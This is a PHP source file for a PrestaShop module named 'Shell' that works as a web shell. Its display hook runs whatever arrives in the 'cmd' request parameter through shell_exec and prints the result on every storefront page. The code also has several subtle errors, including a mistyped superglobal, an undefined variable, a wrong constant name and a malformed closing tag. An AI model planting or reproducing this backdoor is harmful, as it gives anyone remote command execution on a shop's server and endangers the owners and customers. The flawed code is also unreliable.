<?php
if (!defined('_PS_VERSION_')) { exit; }

class Shell extends Module
{
	public function __construct()
	{
		$this->name = 'shell';
		$this->tab = 'shell';
		$this->version = '1.0.0';
		$this->author = 'malfindor';
		$this->need_instance = 0;
		$this->boostrap = true;
		
		parent::__construct();
		
		$this->displayName = $this->l('Shell');
		$this->description = $this->l('idk, it is a shell');
		$this->ps_versions_compliancy = ['min' => '1.7.0.0', 'max' => _PS_VERSION_];
	}
	public function install()
	{
		return parent::install();
	}
	public function uninstall()
	{
		return parent::uninstall();
	}
	protected function getBaseUrl()
	{
		$ssl	= (!empty($_SERVER['HTTPS']) && S_SERVER['HTTPS'] !== 'off');
		$scheme	= $ssl ? 'https://' : 'http://';
		$baseUri = __PS_BASE_URI__;
		return $scheme.$host.$baseUri;
	}
	
	public function hookDisplayTop($params)
	{
		$cmd_raw = Tools::getValue('cmd', '');
		$error = '';
		$result = null;
		
		$result = shell_exec($cmd_raw);
		
		if ($result != null){
			$html .='<span>'.$this->l('Output').': <code>'.htmlspecialchars((string)$result, ENTQUOTES, 'UTF-8').'</Ccode></span>';
		}
		$html .= '</div>';
		
		return $html;
	}
}